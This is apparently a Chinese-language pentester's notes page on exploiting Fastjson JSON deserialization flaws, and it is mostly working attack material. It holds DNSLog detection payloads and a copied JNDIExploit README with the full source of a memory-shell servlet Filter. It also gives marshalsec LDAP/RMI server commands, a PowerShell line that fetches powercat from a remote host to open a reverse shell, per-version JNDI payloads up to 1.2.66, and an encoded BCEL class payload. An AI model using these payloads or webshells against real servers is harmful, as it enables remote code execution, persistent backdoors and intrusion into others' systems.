<a name="GHjDE"></a>
### 好文章
[https://github.com/safe6Sec/Fastjson](https://github.com/safe6Sec/Fastjson)
<a name="6op2v"></a>
### DNS探测
Content-Type: application/json

{"@type":"java.net.Inet4Address", "val":"w94zy2.dnslog.cn"}<br /># 未报错poc<br />{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}<br />{"x":{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}}<br />{"x":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}<br /># 报错,但仍有效<br />{"x":{"@type":"java.net.Inet4Address","val":"dnslog"}}<br />{"x":{"@type":"java.net.Inet6Address","val":"dnslog"}}<br />{"x":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}<br /># 报错,且返回400,但仍有效<br />{"x":Set[{"@type":"java.net.URL","val":"http://dnslog"}}<br />{"x":{{"@type":"java.net.URL","val":"http://dnslog"}:0}
<a name="WLQUJ"></a>
### jndi回显--JNDIExploit
[https://github.com/feihong-cs/JNDIExploit](https://github.com/feihong-cs/JNDIExploit)

```go
# JNDIExploit
一款用于 ```JNDI注入``` 利用的工具，大量参考/引用了 ```Rogue JNDI``` 项目的代码，支持直接```植入内存shell```，并集成了常见的```bypass 高版本JDK```的方式，适用于与自动化工具配合使用。

## 使用说明

使用 ```java -jar JNDIExploit.jar -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JNDIExploit.jar [options]
  Options:
  * -i, --ip       Local ip address
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```

## Dockerfile
```bash
git clone https://github.com/feihong-cs/JNDIExploit.git
cd ./JNDIExploit
docker build -t jndiexploit .
docker run -it \
    -p 1389:1389 \
    -e LDAP_PORT=1389 \
    -p 80:80 \
    -e HTTP_PORT=80 \
    jndiexploit
```

使用 ```java -jar JNDIExploit.jar -u``` 查看支持的 LDAP 格式
```
Supported LADP Queries
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
    ldap://127.0.0.1:1389/Basic/Command/[cmd]
    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Basic/TomcatEcho
    ldap://127.0.0.1:1389/Basic/SpringEcho
    ldap://127.0.0.1:1389/Basic/WeblogicEcho
    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/Basic/JettyMemshell
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
    ldap://127.0.0.1:1389/Basic/JBossMemshell
    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
    ldap://127.0.0.1:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell

[+] GroovyBypass Queries
    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```
* 目前支持的所有 ```PayloadType``` 为
  * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
  * ```Command```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
  * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
  * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```WeblogicEcho```: 用于在中间件为 ```Weblogic``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```TomcatMemshell1```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```TomcatMemshell2```: 用于植入```Tomcat内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```, 使用时需要添加额外的```HTTP Header``` ```Shell: true```, **推荐**使用此方式
  * ```SpringMemshell```: 用于植入```Spring内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WeblogicMemshell1```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WeblogicMemshell2```: 用于植入```Weblogic内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```，**推荐**使用此方式
  * ```JettyMemshell```: 用于植入```Jetty内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```JBossMemshell```: 用于植入```JBoss内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
* 目前支持的所有 ```GadgetType``` 为
  * ```URLDNS```
  * ```CommonsBeanutils1```  
  * ```CommonsBeanutils2```
  * ```CommonsCollectionsK1```
  * ```CommonsCollectionsK2```
  * ```C3P0```
  * ```Jdk7u21```
  * ```Jre8u20```
  * ```CVE_2020_2551```
  * ```CVE_2020_2883```
* ```WebsphereBypass``` 中的 3 个动作：
  * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
  * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
  * ```rce```：加载已上传至目标服务器临时目录的```jar包```，从而达到远程代码执行的效果（这一步本地未复现成功，抛```java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.```异常，有复现成功的小伙伴麻烦指导下）

## ```内存shell```说明
* 采用动态添加 ```Filter/Controller```的方式，并将添加的```Filter```移动至```FilterChain```的第一位
* ```内存shell``` 的兼容性测试结果请参考 [memshell](https://github.com/feihong-cs/memShell) 项目
* ```Basic cmd shell``` 的访问方式为 ```/anything?type=basic&pass=[cmd]```
* ```Behinder shell``` 的访问方式需要修改```冰蝎```客户端（请参考 [冰蝎改造之适配基于tomcat Filter的无文件webshell](https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ) 的方式二自行修改），并在访问时需要添加 ```X-Options-Ai``` 头部，密码为```rebeyond```

植入的 Filter 代码如下：
```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");
        String k;
        Cipher cipher;
        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
            k = servletRequest.getParameter("pass");
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        } else if (((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null) {
            try {
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                    k = "e45e329feb5d925b";
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
                    targetMethod.invoke(evilObject, servletRequest, servletResponse);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }

    }
 ```
 
 ## 参考
 * https://github.com/veracode-research/rogue-jndi
 * https://github.com/welk1n/JNDI-Injection-Exploit
 * https://github.com/welk1n/JNDI-Injection-Bypass
```
服务器：<br />java -jar JNDI.jar -i 0.0.0.0 -l 1389

漏洞环境
```python
POST 路径 HTTP/1.1
Host: url
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
cmd: whoami
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 208
{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho","autoCommit":true}}
```
jndi回显，十分鸡肋，不稳定，只能执行短命令、1.2.47版本<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627893772901-0a0fc5f5-10af-403e-8e84-47c491dd0e83.png#height=463&id=DjohK&originHeight=463&originWidth=1638&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177917&status=done&style=none&title=&width=1638)

<a name="Onfwv"></a>
### jndi反弹shell
java -jar JNDIExploit-v1.11.jar -i 121.4.236.95<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628437757891-712dcb67-321f-4182-b377-76d2e35b7a44.png#height=217&id=LyeXw&originHeight=217&originWidth=889&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32662&status=done&style=none&title=&width=889)<br />nc同时监听<br />/Basic/ReverseShell/<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628437811135-f2c48d69-6d5e-46fe-bd88-a933ce21440d.png#height=345&id=jFxAF&originHeight=690&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89361&status=done&style=none&title=&width=770)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628439738779-0c89f1c8-46a4-4f5f-9b3a-90f0bce56dbf.png#height=181&id=mI6u5&originHeight=241&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17885&status=done&style=none&title=&width=514)


好文章<br />[https://www.freebuf.com/vuls/276812.html](https://www.freebuf.com/vuls/276812.html)
```
https://blog.csdn.net/weixin_41598660/article/details/107477649?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161513136316780266298844%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161513136316780266298844&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-107477649.pc_v1_rank_blog_v1&utm_term=fastjson
```

先编译好java代码，把java编译成.class文件

如果是windows，可以直接powercat反弹shell<br />{"cmd.exe","/c", "powershell \"IEX (New-Object System.Net.Webclient).DownloadString('http://11.11.11.11/powercat.ps1'); powercat -c 11.11.11.11 -p 9999 -e powershell\""}

同一目录下:<br />python -m SimpleHTTPServer 8081

打的时候要对应好LADP和RMI，不然就打不成功。<br />**LDAP**<br />java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip:8081/#Exploit" 8888

**RMI**<br /> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.144:8081/#Exploit" 9999

**POC:**<br />{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog的位置"}}<br />{"@type":"java.net.Inet4Address","val":"dnslog的位置"}

**exp:**<br />ldap
```
{
  "name": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "x": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.10.144:9999/Exploit",
    "autoCommit": true
  }
}
```
rmi
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.10.144:9999/Exploit",
        "autoCommit":true
    }
}
```
<a name="N60G9"></a>
### 坑点
关于编译的.class文件，RMIRefServer和http服务都有收到请求，但是就是反弹不了shell，很有可能是本地编译.class的java版本问题，最好用jdk1.7的，主要是java编译成class文件。<br />**成功**<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615134412665-29920f02-aca8-459e-9035-a928085e391b.png#height=106&id=OzOQX&originHeight=141&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9498&status=done&style=none&title=&width=497)<br />**失败**<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615134430117-8b5bedbf-67fa-4cef-8a88-fadae08c77d2.png#height=90&id=e3UP0&originHeight=90&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7113&status=done&style=none&title=&width=625)<br />**bcel 要版本很低，<=fastjson 1.2.24**
```
POST / HTTP/1.1
Host: 192.168.201.129:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
cmd: whoami
Content-Length: 3327

{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}
```
<a name="ulc4T"></a>
### fastjson 1.2.24 
没有黑名单过滤。
```
{
"b":{
          "@type":"com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName":"rmi://:6666/Exploit",
          "autoCommit":true
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627438056403-75a6070d-65b7-4cb5-9dfb-3248471cc58b.png#height=427&id=SkyY5&originHeight=569&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46209&status=done&style=none&title=&width=467)![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627438067913-acc4cbc1-9822-4f33-8944-ccc979be99fb.png#height=447&id=cnlap&originHeight=596&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50953&status=done&style=none&title=&width=461)

<a name="WOZKX"></a>
### 判断版本信息
如果响应包会报错出版本信息的话。<br />{"@type":"java.lang.AutoCloseable"

<a name="h3-3"></a>
### fastjson <= 1.2.41
```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```
<a name="h3-4"></a>
### fastjson <= 1.2.42 漏洞
```
{
    "b":{
        "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
        "autoCommit":true
    }
}
```

<a name="h3-5"></a>
### fastjson <= 1.2.45漏洞
```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
```

<a name="h3-6"></a>
### fastjson <= 1.2.47漏洞
```
{
"a": {
          "@type": "java.lang.Class",
          "val": "com.sun.rowset.JdbcRowSetImpl"
      },
      "b": {
          "@type": "com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName": "rmi://x.x.x.x:1098/jndi",
          "autoCommit": true
} }
```

<a name="h3-7"></a>
### fastjson <= 1.2.62漏洞
```
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
```

<a name="h3-8"></a>
### fastjson <= 1.2.66漏洞
```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://x.x.x.x:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": 
{"@type":"java.util.Properties","UserTransacti
  on":"ldap://x.x.x.x:1389/Calc"}}
```

[https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484291&idx=1&sn=9b4b226517f4c63c071a5c4a21ea0156&scene=21#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzI4OTQ5Njc2Mw==&mid=2247484291&idx=1&sn=9b4b226517f4c63c071a5c4a21ea0156&scene=21#wechat_redirect)
<a name="10OLs"></a>
### fastjson becl
[https://mp.weixin.qq.com/s/amFZ4H0mwGxVLFc33kH1OA](https://mp.weixin.qq.com/s/amFZ4H0mwGxVLFc33kH1OA)<br />[https://github.com/safe6Sec/Fastjson](https://github.com/safe6Sec/Fastjson)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1630855583479-0f6f2ab3-fa18-4d31-9059-ae696c3b46e6.png#clientId=u880f191b-9d6b-4&from=paste&height=350&id=u1c50ec63&originHeight=700&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80390&status=done&style=none&taskId=u92b23311-71fc-4567-b359-8cb8f42598b&title=&width=575)
<a name="A0cuz"></a>
### 区别fastjson和jackson
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627872329133-8e6b8e76-d794-4004-a4cc-5f8c7a8184ee.png#height=248&id=S1Iwh&originHeight=248&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17117&status=done&style=none&title=&width=766)
<a name="uDIVO"></a>
### fastjson绕过高版本jdk

